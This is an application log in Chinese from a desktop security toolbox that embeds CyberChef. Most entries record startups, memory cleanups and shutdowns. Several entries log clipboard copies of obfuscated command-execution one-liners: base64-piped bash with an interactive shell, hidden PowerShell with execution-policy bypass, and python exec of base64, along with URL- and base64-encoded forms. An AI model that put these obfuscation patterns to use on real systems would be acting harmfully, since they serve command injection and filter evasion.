2025-06-23 15:53:27,071 [INFO] 定义配置类完成...
2025-06-23 15:53:27,072 [INFO] 定义工具类完成...
2025-06-23 15:53:27,072 [INFO] 程序开始运行...
2025-06-23 15:53:27,130 [INFO] 创建 QApplication 实例...
2025-06-23 15:53:27,130 [INFO] 初始化主窗口...
2025-06-23 15:53:27,132 [INFO] 初始化配置...
2025-06-23 15:53:27,132 [INFO] 加载配置...
2025-06-23 15:53:27,132 [INFO] 配置加载完成: 3个导航项, 13个工具
2025-06-23 15:53:27,133 [INFO] 后台工作线程初始化完成
2025-06-23 15:53:27,133 [INFO] 开始初始化界面...
2025-06-23 15:53:27,517 [INFO] 界面初始化完成
2025-06-23 15:53:27,518 [INFO] 主窗口初始化完成
2025-06-23 15:53:27,520 [INFO] 创建主窗口...
2025-06-23 15:53:27,598 [INFO] 显示主窗口...
2025-06-23 15:53:34,441 [INFO] CyberChef加载成功
2025-06-23 15:53:35,269 [INFO] CyberChef加载成功
2025-06-23 15:53:57,127 [INFO] 内存优化完成
2025-06-23 15:54:27,128 [INFO] 内存优化完成
2025-06-23 15:54:57,135 [INFO] 内存优化完成
2025-06-23 15:55:08,883 [INFO] CyberChef加载成功
2025-06-23 15:55:27,142 [INFO] 内存优化完成
2025-06-23 15:55:57,139 [INFO] 内存优化完成
2025-06-23 15:56:09,437 [INFO] CyberChef加载成功
2025-06-23 15:56:10,318 [INFO] CyberChef加载成功
2025-06-23 15:56:11,300 [INFO] CyberChef加载成功
2025-06-23 15:56:12,179 [INFO] CyberChef加载成功
2025-06-23 15:56:13,362 [INFO] CyberChef加载成功
2025-06-23 15:56:27,020 [INFO] CyberChef加载成功
2025-06-23 15:56:27,145 [INFO] 内存优化完成
2025-06-23 15:56:28,191 [INFO] CyberChef加载成功
2025-06-23 15:56:31,405 [INFO] CyberChef加载成功
2025-06-23 15:56:32,262 [INFO] 正在关闭应用程序，请稍候...
2025-06-23 15:56:33,264 [WARNING] Pip安装线程未能及时停止。
2025-06-23 15:57:31,068 [INFO] 定义配置类完成...
2025-06-23 15:57:31,068 [INFO] 定义工具类完成...
2025-06-23 15:57:31,069 [INFO] 程序开始运行...
2025-06-23 15:57:31,125 [INFO] 创建 QApplication 实例...
2025-06-23 15:57:31,126 [INFO] 初始化主窗口...
2025-06-23 15:57:31,126 [INFO] 初始化配置...
2025-06-23 15:57:31,127 [INFO] 加载配置...
2025-06-23 15:57:31,127 [INFO] 配置加载完成: 3个导航项, 13个工具
2025-06-23 15:57:31,128 [INFO] 后台工作线程初始化完成
2025-06-23 15:57:31,128 [INFO] 开始初始化界面...
2025-06-23 15:57:31,413 [INFO] 界面初始化完成
2025-06-23 15:57:31,413 [INFO] 主窗口初始化完成
2025-06-23 15:57:31,417 [INFO] 创建主窗口...
2025-06-23 15:57:31,499 [INFO] 显示主窗口...
2025-06-23 15:58:01,129 [INFO] 内存优化完成
2025-06-23 15:58:20,936 [INFO] 正在关闭应用程序，请稍候...
2025-06-23 15:58:21,949 [WARNING] Pip安装线程未能及时停止。
2025-06-23 16:01:43,459 [INFO] 定义配置类完成...
2025-06-23 16:01:43,459 [INFO] 定义工具类完成...
2025-06-23 16:01:43,459 [INFO] 程序开始运行...
2025-06-23 16:01:43,517 [INFO] 创建 QApplication 实例...
2025-06-23 16:01:43,518 [INFO] 初始化主窗口...
2025-06-23 16:01:43,518 [INFO] 初始化配置...
2025-06-23 16:01:43,519 [INFO] 加载配置...
2025-06-23 16:01:43,519 [INFO] 配置加载完成: 3个导航项, 13个工具
2025-06-23 16:01:43,520 [INFO] 后台工作线程初始化完成
2025-06-23 16:01:43,520 [INFO] 开始初始化界面...
2025-06-23 16:01:43,802 [INFO] 界面初始化完成
2025-06-23 16:01:43,802 [INFO] 主窗口初始化完成
2025-06-23 16:01:43,805 [INFO] 创建主窗口...
2025-06-23 16:01:43,878 [INFO] 显示主窗口...
2025-06-23 16:02:13,527 [INFO] 内存优化完成
2025-06-23 16:02:42,702 [INFO] CyberChef加载成功
2025-06-23 16:02:43,518 [INFO] 内存优化完成
2025-06-23 16:02:43,996 [INFO] CyberChef加载成功
2025-06-23 16:03:12,226 [INFO] CyberChef加载成功
2025-06-23 16:03:13,516 [INFO] 内存优化完成
2025-06-23 16:03:35,385 [INFO] CyberChef加载成功
2025-06-23 16:03:43,518 [INFO] 内存优化完成
2025-06-23 16:04:13,517 [INFO] 内存优化完成
2025-06-23 16:04:43,518 [INFO] 内存优化完成
2025-06-23 16:05:13,528 [INFO] 内存优化完成
2025-06-23 16:05:43,514 [INFO] 内存优化完成
2025-06-23 16:05:46,236 [INFO] 正在关闭应用程序，请稍候...
2025-06-23 16:05:47,242 [WARNING] Pip安装线程未能及时停止。
2025-06-23 16:05:48,276 [INFO] 定义配置类完成...
2025-06-23 16:05:48,276 [INFO] 定义工具类完成...
2025-06-23 16:05:48,276 [INFO] 程序开始运行...
2025-06-23 16:05:48,333 [INFO] 创建 QApplication 实例...
2025-06-23 16:05:48,334 [INFO] 初始化主窗口...
2025-06-23 16:05:48,334 [INFO] 初始化配置...
2025-06-23 16:05:48,335 [INFO] 加载配置...
2025-06-23 16:05:48,335 [INFO] 配置加载完成: 3个导航项, 13个工具
2025-06-23 16:05:48,335 [INFO] 后台工作线程初始化完成
2025-06-23 16:05:48,335 [INFO] 开始初始化界面...
2025-06-23 16:05:48,615 [INFO] 界面初始化完成
2025-06-23 16:05:48,616 [INFO] 主窗口初始化完成
2025-06-23 16:05:48,619 [INFO] 创建主窗口...
2025-06-23 16:05:48,693 [INFO] 显示主窗口...
2025-06-23 16:06:02,293 [INFO] 正在关闭应用程序，请稍候...
2025-06-23 16:06:03,300 [WARNING] Pip安装线程未能及时停止。
2025-06-23 16:07:50,344 [INFO] 定义配置类完成...
2025-06-23 16:07:50,344 [INFO] 定义工具类完成...
2025-06-23 16:07:50,344 [INFO] 程序开始运行...
2025-06-23 16:07:50,400 [INFO] 创建 QApplication 实例...
2025-06-23 16:07:50,401 [INFO] 初始化主窗口...
2025-06-23 16:07:50,401 [INFO] 初始化配置...
2025-06-23 16:07:50,401 [INFO] 加载配置...
2025-06-23 16:07:50,402 [INFO] 配置加载完成: 3个导航项, 13个工具
2025-06-23 16:07:50,403 [INFO] 后台工作线程初始化完成
2025-06-23 16:07:50,403 [INFO] 开始初始化界面...
2025-06-23 16:07:50,671 [INFO] 界面初始化完成
2025-06-23 16:07:50,672 [INFO] 主窗口初始化完成
2025-06-23 16:07:50,675 [INFO] 创建主窗口...
2025-06-23 16:07:50,749 [INFO] 显示主窗口...
2025-06-23 16:07:59,649 [INFO] 通过桥接复制到剪贴板: bash -c {echo,aWQ=}|{base64,-d}|{bash,-i}...
2025-06-23 16:08:03,935 [INFO] 正在关闭应用程序，请稍候...
2025-06-23 16:08:04,939 [WARNING] Pip安装线程未能及时停止。
2025-06-23 16:11:20,620 [INFO] 定义配置类完成...
2025-06-23 16:11:20,620 [INFO] 定义工具类完成...
2025-06-23 16:11:20,620 [INFO] 程序开始运行...
2025-06-23 16:11:20,674 [INFO] 创建 QApplication 实例...
2025-06-23 16:11:20,675 [INFO] 初始化主窗口...
2025-06-23 16:11:20,675 [INFO] 初始化配置...
2025-06-23 16:11:20,675 [INFO] 加载配置...
2025-06-23 16:11:20,676 [INFO] 配置加载完成: 3个导航项, 13个工具
2025-06-23 16:11:20,677 [INFO] 后台工作线程初始化完成
2025-06-23 16:11:20,677 [INFO] 开始初始化界面...
2025-06-23 16:11:20,957 [INFO] 界面初始化完成
2025-06-23 16:11:20,957 [INFO] 主窗口初始化完成
2025-06-23 16:11:20,960 [INFO] 创建主窗口...
2025-06-23 16:11:21,035 [INFO] 显示主窗口...
2025-06-23 16:11:40,797 [INFO] 通过桥接复制到剪贴板: bash -c {echo,aWQ=}|{base64,-d}|{bash,-i}...
2025-06-23 16:11:50,676 [INFO] 内存优化完成
2025-06-23 16:12:20,690 [INFO] 内存优化完成
2025-06-23 16:12:50,700 [INFO] 内存优化完成
2025-06-23 16:12:59,996 [INFO] 定义配置类完成...
2025-06-23 16:12:59,996 [INFO] 定义工具类完成...
2025-06-23 16:12:59,997 [INFO] 程序开始运行...
2025-06-23 16:13:00,053 [INFO] 创建 QApplication 实例...
2025-06-23 16:13:00,054 [INFO] 初始化主窗口...
2025-06-23 16:13:00,054 [INFO] 初始化配置...
2025-06-23 16:13:00,054 [INFO] 加载配置...
2025-06-23 16:13:00,055 [INFO] 配置加载完成: 3个导航项, 13个工具
2025-06-23 16:13:00,056 [INFO] 后台工作线程初始化完成
2025-06-23 16:13:00,056 [INFO] 开始初始化界面...
2025-06-23 16:13:00,355 [INFO] 界面初始化完成
2025-06-23 16:13:00,355 [INFO] 主窗口初始化完成
2025-06-23 16:13:00,359 [INFO] 创建主窗口...
2025-06-23 16:13:00,435 [INFO] 显示主窗口...
2025-06-23 16:13:10,774 [INFO] 通过桥接复制到剪贴板: bash -c {echo,aWQ=}|{base64,-d}|{bash,-i}...
2025-06-23 16:13:16,171 [INFO] 正在关闭应用程序，请稍候...
2025-06-23 16:13:17,179 [WARNING] Pip安装线程未能及时停止。
2025-06-23 16:13:28,533 [INFO] 定义配置类完成...
2025-06-23 16:13:28,534 [INFO] 定义工具类完成...
2025-06-23 16:13:28,534 [INFO] 程序开始运行...
2025-06-23 16:13:28,587 [INFO] 创建 QApplication 实例...
2025-06-23 16:13:28,588 [INFO] 初始化主窗口...
2025-06-23 16:13:28,589 [INFO] 初始化配置...
2025-06-23 16:13:28,589 [INFO] 加载配置...
2025-06-23 16:13:28,590 [INFO] 配置加载完成: 3个导航项, 13个工具
2025-06-23 16:13:28,591 [INFO] 后台工作线程初始化完成
2025-06-23 16:13:28,591 [INFO] 开始初始化界面...
2025-06-23 16:13:28,880 [INFO] 界面初始化完成
2025-06-23 16:13:28,880 [INFO] 主窗口初始化完成
2025-06-23 16:13:28,883 [INFO] 创建主窗口...
2025-06-23 16:13:28,956 [INFO] 显示主窗口...
2025-06-23 16:13:47,296 [INFO] 正在关闭应用程序，请稍候...
2025-06-23 16:13:48,309 [WARNING] Pip安装线程未能及时停止。
2025-06-23 16:14:42,423 [INFO] 定义配置类完成...
2025-06-23 16:14:42,424 [INFO] 定义工具类完成...
2025-06-23 16:14:42,424 [INFO] 程序开始运行...
2025-06-23 16:14:42,479 [INFO] 创建 QApplication 实例...
2025-06-23 16:14:42,480 [INFO] 初始化主窗口...
2025-06-23 16:14:42,481 [INFO] 初始化配置...
2025-06-23 16:14:42,481 [INFO] 加载配置...
2025-06-23 16:14:42,481 [INFO] 配置加载完成: 3个导航项, 13个工具
2025-06-23 16:14:42,482 [INFO] 后台工作线程初始化完成
2025-06-23 16:14:42,482 [INFO] 开始初始化界面...
2025-06-23 16:14:42,775 [INFO] 界面初始化完成
2025-06-23 16:14:42,775 [INFO] 主窗口初始化完成
2025-06-23 16:14:42,778 [INFO] 创建主窗口...
2025-06-23 16:14:42,852 [INFO] 显示主窗口...
2025-06-23 16:15:12,498 [INFO] 内存优化完成
2025-06-23 16:15:27,092 [INFO] 通过桥接复制到剪贴板: powershell.exe -NonI -W Hidden -NoP -Exec Bypass -...
2025-06-23 16:15:42,489 [INFO] 内存优化完成
2025-06-23 16:15:56,534 [INFO] 通过桥接复制到剪贴板: python -c exec('aWQ='.decode('base64'))...
2025-06-23 16:16:00,091 [INFO] 正在关闭应用程序，请稍候...
2025-06-23 16:16:01,099 [WARNING] Pip安装线程未能及时停止。
2025-06-23 16:16:53,740 [INFO] 定义配置类完成...
2025-06-23 16:16:53,740 [INFO] 定义工具类完成...
2025-06-23 16:16:53,740 [INFO] 程序开始运行...
2025-06-23 16:16:53,798 [INFO] 创建 QApplication 实例...
2025-06-23 16:16:53,798 [INFO] 初始化主窗口...
2025-06-23 16:16:53,799 [INFO] 初始化配置...
2025-06-23 16:16:53,799 [INFO] 加载配置...
2025-06-23 16:16:53,799 [INFO] 配置加载完成: 3个导航项, 13个工具
2025-06-23 16:16:53,800 [INFO] 后台工作线程初始化完成
2025-06-23 16:16:53,800 [INFO] 开始初始化界面...
2025-06-23 16:16:54,077 [INFO] 界面初始化完成
2025-06-23 16:16:54,077 [INFO] 主窗口初始化完成
2025-06-23 16:16:54,080 [INFO] 创建主窗口...
2025-06-23 16:16:54,153 [INFO] 显示主窗口...
2025-06-23 16:17:10,275 [INFO] 通过桥接复制到剪贴板: bash%20-c%20%7Becho%2CaWQ%3D%7D%7C%7Bbase64%2C-d%7...
2025-06-23 16:17:23,459 [INFO] 通过桥接复制到剪贴板: bash%20-c%20%7Becho%2CaWQ%3D%7D%7C%7Bbase64%2C-d%7...
2025-06-23 16:17:23,817 [INFO] 内存优化完成
2025-06-23 16:17:27,614 [INFO] 通过桥接复制到剪贴板: YmFzaCAtYyB7ZWNobyxhV1E9fXx7YmFzZTY0LC1kfXx7YmFzaC...
2025-06-23 16:17:32,953 [INFO] 正在关闭应用程序，请稍候...
2025-06-23 16:17:33,968 [WARNING] Pip安装线程未能及时停止。
2025-06-23 16:17:59,844 [INFO] 定义配置类完成...
2025-06-23 16:17:59,844 [INFO] 定义工具类完成...
2025-06-23 16:17:59,845 [INFO] 程序开始运行...
2025-06-23 16:17:59,899 [INFO] 创建 QApplication 实例...
2025-06-23 16:17:59,899 [INFO] 初始化主窗口...
2025-06-23 16:17:59,900 [INFO] 初始化配置...
2025-06-23 16:17:59,901 [INFO] 加载配置...
2025-06-23 16:17:59,901 [INFO] 配置加载完成: 3个导航项, 13个工具
2025-06-23 16:17:59,902 [INFO] 后台工作线程初始化完成
2025-06-23 16:17:59,902 [INFO] 开始初始化界面...
2025-06-23 16:18:00,184 [INFO] 界面初始化完成
2025-06-23 16:18:00,184 [INFO] 主窗口初始化完成
2025-06-23 16:18:00,187 [INFO] 创建主窗口...
2025-06-23 16:18:00,261 [INFO] 显示主窗口...
2025-06-23 16:18:29,910 [INFO] 内存优化完成
2025-06-23 16:18:59,921 [INFO] 内存优化完成
2025-06-23 16:19:19,303 [INFO] 正在关闭应用程序，请稍候...
2025-06-23 16:19:20,312 [WARNING] Pip安装线程未能及时停止。
2025-06-23 16:19:21,287 [INFO] 定义配置类完成...
2025-06-23 16:19:21,288 [INFO] 定义工具类完成...
2025-06-23 16:19:21,288 [INFO] 程序开始运行...
2025-06-23 16:19:21,343 [INFO] 创建 QApplication 实例...
2025-06-23 16:19:21,344 [INFO] 初始化主窗口...
2025-06-23 16:19:21,344 [INFO] 初始化配置...
2025-06-23 16:19:21,345 [INFO] 加载配置...
2025-06-23 16:19:21,345 [INFO] 配置加载完成: 3个导航项, 13个工具
2025-06-23 16:19:21,346 [INFO] 后台工作线程初始化完成
2025-06-23 16:19:21,346 [INFO] 开始初始化界面...
2025-06-23 16:19:21,631 [INFO] 界面初始化完成
2025-06-23 16:19:21,632 [INFO] 主窗口初始化完成
2025-06-23 16:19:21,634 [INFO] 创建主窗口...
2025-06-23 16:19:21,710 [INFO] 显示主窗口...
2025-06-23 16:19:51,347 [INFO] 内存优化完成
2025-06-23 16:20:19,844 [INFO] CyberChef加载成功
2025-06-23 16:20:21,364 [INFO] 内存优化完成
2025-06-23 16:20:36,492 [INFO] 正在关闭应用程序，请稍候...
2025-06-23 16:20:37,494 [WARNING] Pip安装线程未能及时停止。
2025-06-23 16:20:49,766 [INFO] 定义配置类完成...
2025-06-23 16:20:49,767 [INFO] 定义工具类完成...
2025-06-23 16:20:49,767 [INFO] 程序开始运行...
2025-06-23 16:20:49,820 [INFO] 创建 QApplication 实例...
2025-06-23 16:20:49,821 [INFO] 初始化主窗口...
2025-06-23 16:20:49,822 [INFO] 初始化配置...
2025-06-23 16:20:49,822 [INFO] 加载配置...
2025-06-23 16:20:49,822 [INFO] 配置加载完成: 3个导航项, 13个工具
2025-06-23 16:20:49,824 [INFO] 后台工作线程初始化完成
2025-06-23 16:20:49,824 [INFO] 开始初始化界面...
2025-06-23 16:20:50,100 [INFO] 界面初始化完成
2025-06-23 16:20:50,101 [INFO] 主窗口初始化完成
2025-06-23 16:20:50,104 [INFO] 创建主窗口...
2025-06-23 16:20:50,176 [INFO] 显示主窗口...
2025-06-23 16:21:19,837 [INFO] 内存优化完成
2025-06-23 16:21:49,841 [INFO] 内存优化完成
2025-06-23 16:22:19,848 [INFO] 内存优化完成
2025-06-23 16:22:49,866 [INFO] 内存优化完成
2025-06-23 16:23:19,860 [INFO] 内存优化完成
2025-06-23 16:23:49,876 [INFO] 内存优化完成
2025-06-23 16:24:19,883 [INFO] 内存优化完成
2025-06-23 16:24:40,489 [INFO] 通过桥接复制到剪贴板: sh%20-c%20%24%40%7Csh%20.%20echo%20id...
2025-06-23 16:24:49,885 [INFO] 内存优化完成
2025-06-23 16:24:53,408 [INFO] CyberChef加载成功
2025-06-23 16:24:56,911 [INFO] 正在关闭应用程序，请稍候...
2025-06-23 16:24:57,915 [WARNING] Pip安装线程未能及时停止。
2025-06-23 16:32:54,239 [INFO] 定义配置类完成...
2025-06-23 16:32:54,239 [INFO] 定义工具类完成...
2025-06-23 16:32:54,240 [INFO] 程序开始运行...
2025-06-23 16:32:54,299 [INFO] 创建 QApplication 实例...
2025-06-23 16:32:54,299 [INFO] 初始化主窗口...
2025-06-23 16:32:54,300 [INFO] 初始化配置...
2025-06-23 16:32:54,300 [INFO] 加载配置...
2025-06-23 16:32:54,300 [INFO] 配置加载完成: 3个导航项, 13个工具
2025-06-23 16:32:54,301 [INFO] 后台工作线程初始化完成
2025-06-23 16:32:54,301 [INFO] 开始初始化界面...
2025-06-23 16:32:54,594 [INFO] 界面初始化完成
2025-06-23 16:32:54,594 [INFO] 主窗口初始化完成
2025-06-23 16:32:54,597 [INFO] 创建主窗口...
2025-06-23 16:32:54,678 [INFO] 显示主窗口...
2025-06-23 16:32:56,831 [INFO] CyberChef加载成功
2025-06-23 16:32:58,038 [INFO] 正在关闭应用程序，请稍候...
2025-06-23 16:32:59,042 [WARNING] Pip安装线程未能及时停止。
2025-06-23 16:33:26,631 [INFO] 定义配置类完成...
2025-06-23 16:33:26,632 [INFO] 定义工具类完成...
2025-06-23 16:33:26,632 [INFO] 程序开始运行...
2025-06-23 16:33:26,684 [INFO] 创建 QApplication 实例...
2025-06-23 16:33:26,686 [INFO] 初始化主窗口...
2025-06-23 16:33:26,686 [INFO] 初始化配置...
2025-06-23 16:33:26,686 [INFO] 加载配置...
2025-06-23 16:33:26,686 [INFO] 配置加载完成: 3个导航项, 13个工具
2025-06-23 16:33:26,687 [INFO] 后台工作线程初始化完成
2025-06-23 16:33:26,687 [INFO] 开始初始化界面...
2025-06-23 16:33:26,965 [INFO] 界面初始化完成
2025-06-23 16:33:26,966 [INFO] 主窗口初始化完成
2025-06-23 16:33:26,968 [INFO] 创建主窗口...
2025-06-23 16:33:27,040 [INFO] 显示主窗口...
2025-06-23 16:33:29,547 [INFO] CyberChef加载成功
2025-06-23 16:33:32,417 [INFO] 正在关闭应用程序，请稍候...
2025-06-23 16:33:33,423 [WARNING] Pip安装线程未能及时停止。
